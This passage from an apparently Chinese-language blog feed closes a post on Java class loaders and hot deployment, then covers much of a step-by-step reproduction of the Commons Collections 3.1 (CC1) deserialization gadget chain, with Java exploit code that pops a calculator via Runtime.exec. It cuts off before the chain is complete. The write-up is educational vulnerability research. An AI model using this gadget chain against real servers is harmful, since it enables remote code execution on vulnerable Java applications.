     clazz.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="热部署类加载器"><a href="#热部署类加载器" class="headerlink" title="热部署类加载器"></a>热部署类加载器</h5><p>当我们调用<code>loadClass</code>方法加载类时，会采用双亲委派模式，即如果类已经被加载，就从缓存中获取，不会重新加载，如果同一个<code>class</code>被同一个类加载器加载多次，则会报错。因此我们要实现热部署让同一个<code>class</code>文件被不同的类加载器重复加载即可，但是不能调用<code>loadClass</code>方法，而应该调用<code>findClass</code>方法，避开双亲委派模式，从而实现同一个类被多次加载，实现热部署。</p><p>具体测试</p><p>使用<code>loadClass</code>加载，输出的<code>hashCode</code>是相同的，说明没有被重复加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        MyFileClassLoader classLoader1 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        MyFileClassLoader classLoader2 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>,classLoader1);</span><br><span class="line">        Class&lt;?&gt; clazz1 = classLoader1.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        Class&lt;?&gt; clazz2 = classLoader2.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        System.out.println(clazz1.hashCode());</span><br><span class="line">        System.out.println(clazz2.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>findClass</code>加载，输出的<code>hashCode</code>是不同的，说明被重复加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        MyFileClassLoader classLoader1 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        MyFileClassLoader classLoader2 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>,classLoader1);</span><br><span class="line">        Class&lt;?&gt; clazz1 = classLoader1.findClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        Class&lt;?&gt; clazz2 = classLoader2.findClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        System.out.println(clazz1.hashCode());</span><br><span class="line">        System.out.println(clazz2.hashCode());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="类的显式与隐式加载"><a href="#类的显式与隐式加载" class="headerlink" title="类的显式与隐式加载"></a>类的显式与隐式加载</h4><p>类的加载方式是指虚拟机将<code>class</code>文件加载到内存的方式。</p><p>显式加载是指在Java代码中通过调用<code>ClassLoader</code>加载<code>class</code>对象，比如<code>Class.forName(String name)</code>或者<code>this.getClass().getClassLoader().loadClass()</code>加载类</p><p>隐式加载不需要在Java代码中明确调用加载的代码，而是通过虚拟机自动加载到内存中，比如在加载某个<code>class</code>时，该<code>class</code>引用了另外一个类的对象，那么这个对象的字节码文件就会被虚拟机自动加载到内存中。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;类的加载概述&quot;&gt;&lt;a href=&quot;#类的加载概述&quot; class=&quot;headerlink&quot; title=&quot;类的加载概述&quot;&gt;&lt;/a&gt;类的加载概述&lt;/h4&gt;&lt;p&gt;我们编写的&lt;code&gt;.java&lt;/code&gt;扩展名的源代码文件存储着要执行的程序逻辑，这些文件需要经过&lt;c
      
    
    </summary>
    
    
      <category term="java" scheme="elssm.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java CC1链复现与分析</title>
    <link href="elssm.github.io/2021/10/27/Java-CC1%E9%93%BE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>elssm.github.io/2021/10/27/Java-CC1链复现与分析/</id>
    <published>2021-10-27T14:20:34.000Z</published>
    <updated>2021-10-30T08:44:26.535Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h4><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。其实Java JDK已经提供了丰富的集合操作，但是在某些场合下，可能无法满足，apache commons组件提供了更加丰富的集数据结构。</p><h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mac OS Big Sur</span><br><span class="line">JDK-7u6</span><br><span class="line">commons-collections3.1</span><br></pre></td></tr></table></figure><p>JDK7下载地址：<a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html</a></p><p><img src="/2021/10/27/Java-CC1链复现与分析/23.png" alt="23"></p><p>下载好之后查看本地JDK版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % ls /Library/Java/JavaVirtualMachines </span><br><span class="line">jdk1.7.0_06.jdkjdk1.8.0_191.jdk</span><br></pre></td></tr></table></figure><h5 id="IDEA配置"><a href="#IDEA配置" class="headerlink" title="IDEA配置"></a>IDEA配置</h5><p>创建好Maven项目之后，指定对应的JDK版本即可</p><p><img src="/2021/10/27/Java-CC1链复现与分析/1.png" alt="1"></p><p>Common Collections3.1通过maven添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="一个简单反射例子"><a href="#一个简单反射例子" class="headerlink" title="一个简单反射例子"></a>一个简单反射例子</h5><p>在分析该漏洞之前我们先写一个利用反射弹计算器的例子。后面的漏洞分析会基于这个例子进行修改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        Class c = Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        Method m = c.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        m.invoke(r,<span class="string">"open -a calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="从Trnsformer看起"><a href="#从Trnsformer看起" class="headerlink" title="从Trnsformer看起"></a>从Trnsformer看起</h5><p>我们知道该漏洞的问题出现在Transformer接口类，因此我们首先查看一下实现这个类都有哪些方法。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/2.png" alt="2"></p><p>这个时候我们随便点进去一个方法看看具体是怎么实现的。例如在<code>ConstantTransformer</code>类返回的是一个常量。在<code>InvokerTransformer</code>类中实现的是一个反射调用，而且参数都是可控的。因此我们尝试利用<code>InvokerTransformer</code>来改写上面的反射的例子。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/3.png" alt="3"></p><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p>在<code>InvokerTransformer</code>类中存在三个参数是我们可控的，因此我们只需要按照transform方法中的调用方式传值就可以了。改写后的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;).transform(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候我们已经找到了一个点，是<code>InvokerTransformer.transform</code>这个方法，它是一个危险方法，接着我们向上继续找还有哪些调用了<code>transform</code>方法，最好是不同名的</p><p><img src="/2021/10/27/Java-CC1链复现与分析/4.png" alt="4"></p><h5 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h5><p>注意到<code>TransformedMap</code>这个类，因为在这个类中有好几处都调用了<code>transform</code>这个方法。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/5.png" alt="5"></p><p>跟进<code>checkSetValue</code>方法， 发现调用了<code>valueTransformer</code>的<code>transform</code>方法</p><p><img src="/2021/10/27/Java-CC1链复现与分析/6.png" alt="6"></p><p>找到<code>TransformedMap</code>的构造函数，发现传入了一个<code>map</code>和两个<code>Transformer</code>，可以理解为接受一个<code>map</code>并对这个<code>map</code>的<code>key</code>和<code>value</code>做一些操作，因为这是一个保护方法， 我们继续找一下在哪里调用了这个方法。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/7.png" alt="7"></p><p>在构造方法上面找到了<code>decorate</code>静态方法</p><p><img src="/2021/10/27/Java-CC1链复现与分析/8.png" alt="8"></p><p>接着我们向上查找哪些调用了<code>checkSetValue</code>方法，发现只有一处调用了该方法，继续跟进</p><p><img src="/2021/10/27/Java-CC1链复现与分析/9.png" alt="9"></p><p>发现是<code>AbstractInputCheckedMapDecorator</code>类中有一个<code>MapEntry</code>类，这个类调用了<code>setValue</code>方法</p><p><img src="/2021/10/27/Java-CC1链复现与分析/10.png" alt="10"></p><h5 id="MapEntry"><a href="#MapEntry" class="headerlink" title="MapEntry"></a>MapEntry</h5><p>这个时候我们梳理一遍，当我们遍历被修饰的<code>Map</code>的时候，就会走到<code>setValue</code>这个方法，从而会调用<code>checkSetValue</code>，接着调用到了<code>valueTransformer.transform</code>方法，之后就会走到<code>InvokerTransformer.transform</code>方法执行</p><p>我们再次尝试改写上面的例子，首先实例化一个<code>map</code>对象，并对<code>map</code>进行装饰，因为在后面执行<code>transform</code>方法的是<code>decorate</code>方法传入的第三个参数，因此我们可以给第二个参数传一个空值，之后通过<code>for</code>循环调用<code>setValue</code>方法将我们的<code>Runtime.getRuntime()</code>对象传入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">"key"</span>,<span class="string">"value"</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="keyword">null</span>,invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(r);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="jdk源码关联"><a href="#jdk源码关联" class="headerlink" title="jdk源码关联"></a>jdk源码关联</h5><p>这个时候我们继续向上寻找调用链，看哪些类调用了<code>setValue</code>方法，按照流程，我应该能找到在<code>AnnotationInvocationHandler</code>这个类的<code>readObject</code>方法里面调用了<code>setValue</code>方法，可是找了一圈，并没有。。。我以为是我jdk版本的问题，于是在jdk下面查看，路径是<code>rt.jar</code>下面的<code>sun.reflect.annotation</code>，发现这个类不是源代码，所以查找调用的时候不会出现。</p><p>对于这个问题我找到了一个相对合理的解答：因为sun包是hotspot虚拟机中java.<em> 和javax.</em>的底层实现。因为包含在rt中，所以我们也可以调用。但是因为不是sun对外公开承诺的接口，所以根据实现的需要随时增减，因此在不同版本的hotspot中可能是不同的，而且在其他的jdk实现中是没有的，调用这些类，可能不会向后兼容，所以一般不推荐使用。因此如果我们需要查看<code>rt.jar</code>包下的源码就需要进行源码关联。</p><p>JDK-7u6源代码地址：<a href="http://jdk7src.sourceforge.net" target="_blank" rel="noopener">http://jdk7src.sourceforge.net</a></p><p><img src="/2021/10/27/Java-CC1链复现与分析/24.png" alt="24"></p><p>下载好对应JDK版本之后，在IDEA中就可以设置。进入<code>File-&gt;Project Structrue-&gt;SDKs-&gt;Sourcepath</code>中添加即可</p><p><img src="/2021/10/27/Java-CC1链复现与分析/11.png" alt="11"></p><p>这个时候我们再次查看<code>AnnotationInvocationHandler</code>这个类，发现已经是源代码文件了，同样也在<code>setValue</code>放的的调用类中成功找到了这个类</p><p><img src="/2021/10/27/Java-CC1链复现与分析/12.png" alt="12"></p><h5 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h5><p>现在我们可以继续修改我们上面写的例子，将<code>AnnotationInvocationHandler</code>类加进去，尝试实例化这个类，但是由于该类不是<code>public</code>的，不能直接在外部调用，因此需要用到反射去获取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">"key"</span>,<span class="string">"value"</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="keyword">null</span>,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        Class c = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor annotationInvocationHandler = c.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        annotationInvocationHandler.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = annotationInvocationHandler.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">transformedMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String  Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="遇到的三个问题"><a href="#遇到的三个问题" class="headerlink" title="遇到的三个问题"></a>遇到的三个问题</h5><p>这里就会遇到三个问题，第一个问题是<code>setValue</code>，在上面的例子中我们<code>setValue</code>的值直接传入的是一个<code>Runtime</code>对象，但是在<code>AnnotationInvocationHandler</code>类中，这个传入的值并不是我们可控的。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/13.png" alt="13"></p><p>第二个问题是对于<code>Runtime</code>类，它并不是可序列化的，因为它没有继承<code>Serializable</code>接口，因此我们也需要通过反射来实现。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/14.png" alt="14"></p><p>第三个问题是进入<code>AnnotationInvocationHandler</code>类的<code>readObject</code>方法中的<code>setValue</code>方法需要满足两个if条件。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/15.png" alt="15"></p><h5 id="反射调用Runtime"><a href="#反射调用Runtime" class="headerlink" title="反射调用Runtime"></a>反射调用Runtime</h5><p>我们先解决第二个问题，将<code>Runtime</code>对象通过反射实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeReflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Runtime<span class="class">.<span class="keyword">class</span></span>; <span class="comment">//通过反射获取到字节码对象</span></span><br><span class="line">        Method getRuntimeMethod = c.getMethod(<span class="string">"getRuntime"</span>, <span class="keyword">null</span>); <span class="comment">//获取getRuntime静态方法</span></span><br><span class="line">        Runtime r = (Runtime) getRuntimeMethod.invoke(<span class="keyword">null</span>, <span class="keyword">null</span>); <span class="comment">//获取Runtime对象</span></span><br><span class="line">        Method execMethod = c.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>; <span class="comment">//反射调用exec方法</span></span><br><span class="line">        execMethod.invoke(r,<span class="string">"open -a calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们把这个反射调用改成<code>InvokerTransformer</code>的形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeReflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;).transform(Runtime.class);</span><br><span class="line">        Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);</span><br><span class="line">        new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;).transform(r);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h5><p>我们可以发现，实际上是对<code>InvokerTransformer</code>类的<code>transform</code>方法连续调用了三次，不由想到在之前的<code>Transformer</code>的实现类中有一个<code>ChainedTransformer</code>，在它的<code>transform</code>方法中就是一个循环调用的形式。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/16.png" alt="16"></p><p>因此我们尝试使用<code>ChainedTransformer</code>类调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeReflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">      chainedTransformer.transform(Runtime<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Target-class"><a href="#Target-class" class="headerlink" title="Target.class"></a>Target.class</h5><p>接着我们继续修改两个if判断的问题。在第一个if之前首先会遍历我们传入的map并将key赋给name，此时我们拿到的name就是在map中put的<code>key</code>，之后会通过<code>memberTypes.get</code>方法获取name，将值赋给memberType。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/17.png" alt="17"></p><p>由于我们现在传入的是<code>Override.class</code>，在<code>Override</code>中并没有存在成员方法，因此在get的时候就拿不到任何值，所以得到的<code>memberType</code>就为空。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/18.png" alt="18"></p><p><img src="/2021/10/27/Java-CC1链复现与分析/20.png" alt="20"></p><p>因此我们需要找一个有成员方法的class，并将map传入的<code>key</code>值改为成员方法的名字，才可以进入第一层if判断，所以我们使用<code>Target.class</code>代替，并将<code>map.put</code>的<code>key</code>值改为<code>value</code></p><p><img src="/2021/10/27/Java-CC1链复现与分析/19.png" alt="19"></p><p><img src="/2021/10/27/Java-CC1链复现与分析/21.png" alt="21"></p><p>在第二个判断语句中使用<code>isInstance</code>判断是否可以强转，这个判断很明显是<code>false</code>,取反之后正好可以让我们进入第二层if判断，从而执行<code>setValue</code>方法</p><h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" 